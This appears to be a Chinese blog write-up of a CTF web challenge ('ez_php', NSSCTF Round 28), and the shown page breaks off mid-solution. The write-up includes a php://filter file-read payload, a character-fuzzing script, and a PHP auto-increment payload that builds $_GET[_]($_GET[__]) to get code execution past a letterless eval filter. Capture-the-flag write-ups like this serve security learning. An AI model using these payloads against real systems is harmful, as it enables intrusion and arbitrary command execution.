@@ -1,0 +1,1329 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" ez_php 这题前面简单，不多说\n1 2 post传：a[]=1&amp;b[]=2 get传:?password=123456a 解法一日志包含 接下来我打的是日志包含，算是非预期\n各发包2次哈\n解法二打自增 文件包含读取后，有base64字符（还一个非预期直接/file就能出flag）\n">
+<title>2025-nss#round28-web</title>
+
+<link rel='canonical' href='https://luo-kaihong.github.io/p/2025-nss%23round28-web/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="2025-nss#round28-web">
+<meta property='og:description' content=" ez_php 这题前面简单，不多说\n1 2 post传：a[]=1&amp;b[]=2 get传:?password=123456a 解法一日志包含 接下来我打的是日志包含，算是非预期\n各发包2次哈\n解法二打自增 文件包含读取后，有base64字符（还一个非预期直接/file就能出flag）\n">
+<meta property='og:url' content='https://luo-kaihong.github.io/p/2025-nss%23round28-web/'>
+<meta property='og:site_name' content='罗铠鸿'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='emo' /><meta property='article:published_time' content='2025-03-26T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-03-26T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="2025-nss#round28-web">
+<meta name="twitter:description" content=" ez_php 这题前面简单，不多说\n1 2 post传：a[]=1&amp;b[]=2 get传:?password=123456a 解法一日志包含 接下来我打的是日志包含，算是非预期\n各发包2次哈\n解法二打自增 文件包含读取后，有base64字符（还一个非预期直接/file就能出flag）\n">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_b0f9889609c95e4e.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">💗</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">罗铠鸿</a></h1>
+            <h2 class="site-description">爱tingting</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://mpbeta.csdn.net/mp_blog/manage/article?spm=1011.2124.3001.10336'
+                        target="_blank"
+                        title="csdn"
+                        rel="me"
+                    >
+                        
+                        
+                            <?xml version="1.0" ?><!DOCTYPE svg  PUBLIC '-//W3C//DTD SVG 1.1//EN'  'http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd'><svg enable-background="new 0 0 156.457 156.457" height="156.457" id="Layer_1" overflow="visible" version="1.1" viewBox="0 0 156.457 156.457" width="156.457" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><g id="icon"><circle cx="78.229" cy="78.229" fill="#EF7A2B" r="78.229"/><path d="M64.616,117.315c-9.653-0.584-16.453-4.751-19.793-12.154c-1.493-3.292-2.118-6.459-2.153-10.876   c-0.021-2.306,0.403-27.915,0.549-33.193c0.146-5.563,1.188-9.532,3.424-13.019c3.174-4.969,7.667-7.785,14.265-8.879   c2.542-0.424,24.8-0.875,26.96-0.521c5.001,0.827,8.932,2.858,12.224,6.306c2.694,2.823,4.444,6.236,5.257,10.271   c0.563,2.816,0.625,9.584,0.104,12.345c-0.194,0.983-0.223,1.386-0.104,1.386c0.091,0,0.868,0.066,1.716,0.149   c3.403,0.319,5.966,1.132,7.91,2.503c3.396,2.389,5,5.661,5.368,10.928c0.223,3.098,0.181,11.348-0.055,13.293   c-0.792,6.25-2.952,10.979-6.765,14.778c-3.577,3.57-7.737,5.57-13.522,6.501c-1.306,0.208-3.326,0.236-17.467,0.264   C73.735,117.412,65.672,117.371,64.616,117.315L64.616,117.315L64.616,117.315z M99.202,99.036   c1.285-0.334,2.153-0.819,3.091-1.765c2.188-2.194,2.632-5.319,1.16-8.209c-0.417-0.813-1.64-2.027-2.584-2.556   c-1.659-0.931-0.902-0.889-19.335-0.889c-14.862,0-16.786,0.021-17.612,0.223c-3.07,0.757-5.139,3.417-5.139,6.598   c0,1.938,0.66,3.535,2.021,4.868c0.931,0.91,1.632,1.326,2.896,1.688c0.785,0.229,2.097,0.25,17.745,0.264   C96.376,99.258,98.438,99.237,99.202,99.036L99.202,99.036z M85.841,67.988c0.444-0.167,1.139-0.552,1.541-0.854   c4.438-3.333,3.334-10.125-1.958-12.008c-0.569-0.205-1.515-0.267-5.376-0.368c-8.25-0.208-13.695-0.188-14.445,0.052   c-1.194,0.385-2.167,0.972-2.965,1.785c-3.57,3.615-2.167,9.55,2.667,11.275c0.729,0.264,1.34,0.302,6.424,0.417   C83.465,68.551,84.382,68.533,85.841,67.988L85.841,67.988L85.841,67.988z" fill="#FFFFFF"/></g></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#解法一日志包含">解法一日志包含</a></li>
+    <li><a href="#解法二打自增">解法二打自增</a></li>
+  </ol>
+
+  <ol>
+    <li><a href="#非预期">非预期</a></li>
+    <li><a href="#预期解">预期解</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/write.up/" >
+                Write.up
+            </a>
+        
+            <a href="/categories/web/" >
+                Web
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/2025-nss%23round28-web/">2025-nss#round28-web</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2025-03-26</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 6 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <hr>
+<h1 id="ez_php">ez_php
+</h1><p><img src="/p/2025-nss"
+	width="784"
+	height="389"
+	srcset="/p/2025-nss 480w, /p/2025-nss 1024w"
+	loading="lazy"
+	
+		alt="image-20250324211919479"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="201"
+		data-flex-basis="483px"
+	
+></p>
+<p>这题前面简单，不多说</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">post传：a[]=1&amp;b[]=2
+</span></span><span class="line"><span class="cl">get传:?password=123456a
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/images/image-20250324212231847.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250324212231847"
+	
+	
+></p>
+<h2 id="解法一日志包含">解法一日志包含
+</h2><p>接下来我打的是日志包含，算是非预期</p>
+<p><img src="/images/image-20250324212746776.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250324212746776"
+	
+	
+></p>
+<p>各发包2次哈</p>
+<p><img src="/images/image-20250324212816123.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250324212816123"
+	
+	
+></p>
+<h2 id="解法二打自增">解法二打自增
+</h2><p>文件包含读取后，有base64字符（还一个非预期直接/file就能出flag）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">file=php://filter/read=convert.base64-encode/resource=level2.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/images/image-20250324214454949.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250324214454949"
+	
+	
+></p>
+<p>解码得到</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;rce&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$rce</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;rce&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$rce</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">120</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">is_string</span><span class="p">(</span><span class="nv">$rce</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/[!@#%^&amp;*:&#39;\-&lt;?&gt;</span><span class="se">\&#34;</span><span class="s2">\/|`a-zA-Z~</span><span class="se">\\\\</span><span class="s2">]/&#34;</span><span class="p">,</span> <span class="nv">$rce</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">eval</span><span class="p">(</span><span class="nv">$rce</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">echo</span><span class="p">(</span><span class="s2">&#34;Are you hack me?&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;I want string!&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;too long!&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里无字母rce，且过滤了^,~,|,那只能打自增（其实也可以fuzz一下看看可以用哪些）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 定义正则表达式
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$pattern</span> <span class="o">=</span> <span class="s2">&#34;/[a-zA-Z0-9@#%^&amp;*:{}\-&lt;\?&gt;</span><span class="se">\&#34;</span><span class="s2">|`~</span><span class="se">\\\\</span><span class="s2">]/&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 存储未被过滤的字符
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$unfilteredChars</span> <span class="o">=</span> <span class="p">[];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 遍历 ASCII 码从 32 到 127
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">32</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;=</span> <span class="mi">127</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$char</span> <span class="o">=</span> <span class="nx">chr</span><span class="p">(</span><span class="nv">$i</span><span class="p">);</span> <span class="c1">// 获取对应的字符
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="nv">$pattern</span><span class="p">,</span> <span class="nv">$char</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// 检查是否未被过滤
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$unfilteredChars</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$char</span><span class="p">;</span> <span class="c1">// 添加到未过滤字符数组
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 输出未被过滤的字符
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="s2">&#34;未被过滤的字符: &#34;</span> <span class="o">.</span> <span class="nx">implode</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$unfilteredChars</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/images/image-20250324224236542.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250324224236542"
+	
+	
+></p>
+<p>那显然只能打自增</p>
+<p>自增规则简单，比如$a=&lsquo;A&rsquo;;$a++=&lsquo;B&rsquo;,所以只要一个字母A,我就可以构造一个$_GET<a class="link" href="$_GET[__]" ></a>,这样就可以给 <code>_ </code>还有<code>__</code>赋值（这里有数字，但是还是用<code>_</code>,因为我这个照着无数字字母rce打，相当于通用payload），从而到达命令执行的目的,那这个A怎么的得到?</p>
+<p>在php中，数组与字符串连接，会被转换成字符串，值就是Array,那就相对于拿到了所有字母</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$_</span><span class="o">=</span><span class="p">[]</span><span class="o">.</span><span class="s1">&#39;&#39;</span><span class="p">;</span><span class="c1">//Array
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$_</span><span class="o">=</span><span class="nv">$_</span><span class="p">[</span><span class="s1">&#39;&#39;</span><span class="o">==</span><span class="s1">&#39;$&#39;</span><span class="p">];</span><span class="c1">//A
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="c1">//B
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="c1">//C
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="c1">//D
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="c1">//E
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$__</span><span class="o">=</span><span class="nv">$_</span><span class="p">;</span><span class="c1">//E
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="c1">//F
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="c1">//G
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$___</span><span class="o">=</span><span class="nv">$_</span><span class="p">;</span><span class="c1">//G
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="c1">//T
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$_</span><span class="o">=</span><span class="nv">$___</span><span class="o">.</span><span class="nv">$__</span><span class="o">.</span><span class="nv">$_</span><span class="p">;</span><span class="c1">//GET
+</span></span></span><span class="line"><span class="cl"><span class="c1">//var_dump($_);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$_</span><span class="o">=</span><span class="s1">&#39;_&#39;</span><span class="o">.</span><span class="nv">$_</span><span class="p">;</span><span class="c1">//_GET
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">var_dump</span><span class="p">(</span><span class="nv">$$_</span><span class="p">[</span><span class="nx">_</span><span class="p">](</span><span class="nv">$$_</span><span class="p">[</span><span class="nx">__</span><span class="p">]));</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//$_GET[_]($_GET[__])
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>接下来就可以尝试去给<code>_</code>和<code>__</code>GET传参，这里我们需要把换行的都去掉，然后进行一次URL编码，因为中间件会解码一次，所以我们构造的payload先变成这样</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
